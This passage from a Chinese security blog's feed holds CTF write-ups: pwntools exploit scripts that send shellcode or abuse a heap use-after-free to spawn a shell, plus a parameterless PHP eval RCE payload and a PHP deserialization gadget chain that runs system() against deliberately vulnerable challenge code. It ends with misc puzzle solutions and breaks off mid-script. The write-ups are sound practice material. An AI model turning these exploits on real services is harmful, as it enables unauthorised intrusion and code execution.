class="hljs-number">1</span>], <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>]))<br>p.sendline(<span class="hljs-string">&#x27;WWDDDADAD&#x27;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;cat /flag&quot;</span>)<br><span class="hljs-built_in">print</span>(p.readuntil(<span class="hljs-string">&quot;&#125;&quot;</span>))<br><br></code></pre></td></tr></table></figure><h1 id="rhg6"><a href="#rhg6" class="headerlink" title="rhg6"></a>rhg6</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br>p = remote(sys.argv[<span class="hljs-number">1</span>], <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>]))<br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment"># pause()</span><br>shellcode = asm(<span class="hljs-string">&#x27;nop\n&#x27;</span> * <span class="hljs-number">19</span> + shellcraft.sh())<br>shellcode = <span class="hljs-built_in">bytes</span>([i - <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> shellcode])<br>p.send(shellcode)<br><br>p.sendline(<span class="hljs-string">&quot;cat /flag&quot;</span>)<br><span class="hljs-built_in">print</span>(p.readuntil(<span class="hljs-string">&quot;&#125;&quot;</span>))<br><br></code></pre></td></tr></table></figure><h1 id="rhg7"><a href="#rhg7" class="headerlink" title="rhg7"></a>rhg7</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, data=<span class="hljs-string">b&#x27;\n&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;2.show&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    time.sleep(<span class="hljs-number">0.5</span>)<br>    p.send(data)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;2.show&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(ind).encode())<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;2.show\n&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(ind).encode())<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-comment"># p = process(&#x27;./download/rhg7/bin&#x27;)</span><br>p = remote(sys.argv[<span class="hljs-number">1</span>], <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>]))<br>system = <span class="hljs-number">0x80488CE</span><br>bin_sh = <span class="hljs-number">0x080BCF4F</span><br>add(<span class="hljs-number">0x8</span>)  <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x18</span>)  <span class="hljs-comment"># 1</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">8</span>, p32(bin_sh) + p32(system))<br>show(<span class="hljs-number">0</span>)<br><br>p.sendline(<span class="hljs-string">&quot;cat /flag&quot;</span>)<br><span class="hljs-built_in">print</span>(p.readuntil(<span class="hljs-string">&quot;&#125;&quot;</span>))<br><br></code></pre></td></tr></table></figure><h1 id="rhg8"><a href="#rhg8" class="headerlink" title="rhg8"></a>rhg8</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(sys.argv[<span class="hljs-number">1</span>], <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>]))<br>p.sendline(<span class="hljs-string">&#x27;0&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;0&#x27;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;cat /flag&quot;</span>)<br><span class="hljs-built_in">print</span>(p.readuntil(<span class="hljs-string">&quot;&#125;&quot;</span>))<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;第一次打RHG模式，i春秋的平台和在网上看到的不太一样，一轮是一小时，也可以手动一题一题做然后提交&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/wp/2024/2024zhwsb-rhg-1.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;写了个脚本获取题目信息然后下载，运行写好的exp然后提交</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.dr0n.top/tags/wp/"/>
    
    <category term="中华武数杯" scheme="https://www.dr0n.top/tags/%E4%B8%AD%E5%8D%8E%E6%AD%A6%E6%95%B0%E6%9D%AF/"/>
    
    <category term="2024竞赛" scheme="https://www.dr0n.top/tags/2024%E7%AB%9E%E8%B5%9B/"/>
    
    <category term="RHG" scheme="https://www.dr0n.top/tags/RHG/"/>
    
  </entry>
  
  <entry>
    <title>第七届浙江省大学生网络与信息安全竞赛决赛-WP</title>
    <link href="https://www.dr0n.top/posts/f2e1654d/"/>
    <id>https://www.dr0n.top/posts/f2e1654d/</id>
    <published>2024-11-09T06:30:00.000Z</published>
    <updated>2025-07-27T10:03:32.025Z</updated>
    
    <content type="html"><![CDATA[<p>总榜Rank1，在毕业前拿到榜一也是圆满了 :)</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="wucanrce"><a href="#wucanrce" class="headerlink" title="wucanrce"></a>wucanrce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;get只接受code欧,flag在上一级目录&lt;br&gt;&quot;</span>;<br><span class="hljs-variable">$filename</span> = <span class="hljs-keyword">__FILE__</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/session_id\(|readfile\(/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))<br><br>     &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;<br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]);<br>            &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;不让用session欧，readfile也不行&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>无参rce</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//查看上一级目录文件名</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>())));<br><br><span class="hljs-comment">//读取上级目录文件</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>())))))));<br></code></pre></td></tr></table></figure><h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AAA</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$aear</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; aear = <span class="hljs-variable">$a</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span> -&gt; aear;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$new</span> = <span class="hljs-variable language_">$this</span> -&gt; <span class="hljs-keyword">string</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$new</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BBB</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$pop</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; pop = <span class="hljs-variable">$string</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>) </span>&#123;<br>        <span class="hljs-variable">$var</span> = <span class="hljs-variable language_">$this</span> -&gt; <span class="hljs-variable">$value</span>;<br>        <span class="hljs-variable">$var</span>[<span class="hljs-variable">$value</span>]();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DDD</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$bag</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$magazine</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$length</span> = @<span class="hljs-variable language_">$this</span> -&gt; bag -&gt; <span class="hljs-title function_ invoke__">add</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$length</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span> -&gt; magazine -&gt; tower)<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;really??&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EEE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$d</span>=<span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$e</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;d[<span class="hljs-variable language_">$this</span>-&gt;e]=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;d[]=<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nononononnnn!!!&#x27;</span>;<br>            &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;f);<br>            &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FFF</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$cookie</span>;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delete</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span> -&gt; cookie;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hahahhhh&#x27;</span>;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>([<span class="hljs-variable">$this</span>, <span class="hljs-variable">$func</span>.<span class="hljs-string">&quot;haha&quot;</span>], <span class="hljs-variable">$args</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GGG</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$green</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$book</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span> -&gt; book)) == <span class="hljs-number">666</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span> -&gt; green -&gt; pen;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;UP&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;UP&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>反序列化</p><p>调用路径：<br><code>AAA::__destruct--&gt;AAA::__toString--&gt;GGG::__invoke--&gt;EEE::__get</code></p><p>其中到<code>GGG</code>的时候需要爆破一下md5</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> multiprocessing<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> sys<br><br><br>CHARS = string.letters + string.digits<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmp_md5</span>(<span class="hljs-params">substr, stop_event, str_len, start=<span class="hljs-number">0</span>, size=<span class="hljs-number">20</span></span>):<br>    <span class="hljs-keyword">global</span> CHARS<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> stop_event.is_set():<br>        rnds = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size))<br>        md5 = hashlib.md5(rnds)<br>        md5 = hashlib.md5(md5.hexdigest())<br><br>        <span class="hljs-keyword">if</span> md5.hexdigest()[start: start+str_len] == substr <span class="hljs-keyword">and</span> md5.hexdigest()[<span class="hljs-number">3</span>].isdigit()==<span class="hljs-literal">False</span>:<br>            <span class="hljs-built_in">print</span> rnds<br>            stop_event.<span class="hljs-built_in">set</span>()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    substr = sys.argv[<span class="hljs-number">1</span>].strip()<br><br>    start_pos = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>]) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br><br>    str_len = <span class="hljs-built_in">len</span>(substr)<br>    cpus = multiprocessing.cpu_count()<br>    stop_event = multiprocessing.Event()<br>    processes = [multiprocessing.Process(target=cmp_md5, args=(substr, stop_event, str_len, start_pos)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(cpus)]<br><br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> processes:<br>        p.start()<br><br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> processes:<br>        p.join()<br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024-zjss-js-unserialize-1.png"></p><p><code>EEE</code>中的if用报错跳过即可</p><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GGG</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$green</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$book</span>=<span class="hljs-string">&#x27;g1xFqZRDDTyxafSIUSta&#x27;</span>;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AAA</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$aear</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span>;<br>&#125;<br><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EEE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$d</span>=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$e</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f</span>=<span class="hljs-string">&quot;system(&#x27;cat /flag.txt&#x27;);&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">AAA</span>();<br><span class="hljs-variable">$a</span>-&gt;aear = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">AAA</span>();<br><span class="hljs-variable">$a</span>-&gt;aear-&gt;<span class="hljs-keyword">string</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">GGG</span>();<br><span class="hljs-variable">$a</span>-&gt;aear-&gt;<span class="hljs-keyword">string</span>-&gt;green = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EEE</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-comment">//O%3A3%3A%22AAA%22%3A2%3A%7Bs%3A4%3A%22aear%22%3BO%3A3%3A%22AAA%22%3A2%3A%7Bs%3A4%3A%22aear%22%3BN%3Bs%3A6%3A%22string%22%3BO%3A3%3A%22GGG%22%3A2%3A%7Bs%3A5%3A%22green%22%3BO%3A3%3A%22EEE%22%3A3%3A%7Bs%3A1%3A%22d%22%3Bi%3A1%3Bs%3A1%3A%22e%22%3BN%3Bs%3A1%3A%22f%22%3Bs%3A24%3A%22system%28%27cat+%2Fflag.txt%27%29%3B%22%3B%7Ds%3A4%3A%22book%22%3Bs%3A20%3A%22g1xFqZRDDTyxafSIUSta%22%3B%7D%7Ds%3A6%3A%22string%22%3BN%3B%7D</span><br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024-zjss-js-unserialize-2.png"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="FinalSign"><a href="#FinalSign" class="headerlink" title="FinalSign"></a>FinalSign</h2><p>附件是一个txt，存在snow特征，有大量的<code>20</code>，<code>09</code></p><p><img src="/img/wp/2024/2024-zjss-js-FinalSign-1.png"></p><p>用得到的key<code>helloworld</code>去xor txt中的字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;2c243f2f3b3114345d0a0909333f06100143023b2c55020912&#x27;</span>)<br>key=<span class="hljs-string">b&#x27;helloworld&#x27;</span><br>e=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a)):<br>    e.append(a[i]^key[i%<span class="hljs-built_in">len</span>(key)])<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(e))<br><br><br><span class="hljs-comment">#b&#x27;DASCTF&#123;F1nal_Sign1n_D0ne&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="非黑即白"><a href="#非黑即白" class="headerlink" title="非黑即白"></a>非黑即白</h2><p>反转文件，得到一张gif</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;非黑即白&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>   <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.gif&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> g:<br>      g.write(f.read()[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><p>将纯黑色的帧转为<code>0</code>，其他的转为<code>1</code>，得到一个加密的zip</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>a=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;1.gif&quot;</span>)<br>n=<span class="hljs-number">0</span><br>data=<span class="hljs-string">&quot;&quot;</span><br>e=[]<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        a.seek(n)<br>        d=a.copy().convert(<span 